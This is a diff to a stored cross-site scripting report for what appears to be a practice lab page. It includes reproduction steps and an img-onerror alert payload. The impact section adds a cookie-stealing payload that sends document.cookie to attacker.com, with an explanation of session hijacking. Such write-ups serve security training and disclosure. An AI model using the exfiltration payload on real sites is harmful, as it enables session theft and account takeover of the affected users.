@@ -28,18 +28,18 @@ https://kzlabs.com/60.php
 
 ## Steps to Reproduce
 
-1. Log in to the application at `https://kzlabs.com/60.php` with a valid account.
+1. Log in to the application at `https://kzlabs.com/60.php`
 2. Navigate to the **Reports** tab.
 3. Click on **+ New Network Report**.
 4. In the **Report Name** field, enter the following payload:
 
 ```
-abc1'"><img src=x onerror=alert(1)>
+tix5uni'"><img src=x onerror=alert(1)>
 ```
 
-5. Fill in the remaining required fields (Network, Date Range, etc.) and submit the form.
+5. Fill in the remaining required fields and click submit
 6. Once the report is saved, you are redirected back to the Network Reports listing page.
-7. Observe that a JavaScript alert box pops up displaying `1` — confirming that the script executed.
+7. Observe that a JavaScript alert box fires — confirming that the script executed.
 8. Every authenticated user who loads this page will trigger the same alert.
 
 ---
@@ -47,32 +47,33 @@ abc1'"><img src=x onerror=alert(1)>
 ## Payload Used
 
 ```
-abc1'"><img src=x onerror=alert(1)>
+tix5uni'"><img src=x onerror=alert(1)>
 ```
 
 ---
 
 ## Proof of Concept
 
-**Screenshot 1** — The Reports listing page showing the raw script payload stored as-is in row #7 under "Created By" as `<script>alert(1)</script>`, meaning the app saved it exactly as typed with no filtering at all.
+**Screenshot 1** — Entering payload in **Report Name** and click Run and save Report 
 
-<img width="1886" height="925" alt="Screenshot 2026-05-24 003419" src="https://github.com/user-attachments/assets/47168e0e-e123-4c80-bc9d-2101b9f11596" />
+<img width="1005" height="801" alt="lab-60" src="https://github.com/user-attachments/assets/5131a18e-7dce-4516-8d73-7c4a4a2177cd" />
 
 
+**Screenshot 1** — Used an img tag payload `'"><img src=x onerror=a>lert(1)` the alert triggered on page load, which confirms any HTML payload gets executed.
 
-**Screenshot 2** — Used an img tag payload `'"><img src=x onerror=a>lert(1)` this time and the alert still triggered on page load, which confirms it's not just script tags that work here. Any HTML payload gets executed.
+<img width="1302" height="421" alt="lab60_" src="https://github.com/user-attachments/assets/d19ab239-7f97-4331-b760-3719df82497d" />
 
-<img width="1906" height="928" alt="Screenshot 2026-05-24 004633" src="https://github.com/user-attachments/assets/d92d73af-55e5-463f-b29f-53ff09975e32" />
 
 ---
 
 ## Impact
 
-- Steal session cookies of every user who visits the page
-- Take over accounts without needing passwords
-- Admins are affected too since they visit the same page
-- Can inject fake login forms to harvest credentials
-- One submission hits every authenticated user
+- Every authenticated user who visits the reports page gets the payload executed in their browser automatically
+- Full account takeover without needing passwords
+- Real attack payload would be:
+<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
+- This silently sends the victim's session cookie to the attacker's server
+- Attacker pastes that cookie into their browser and is immediately logged in as the victim — no password needed
 
 ---
 
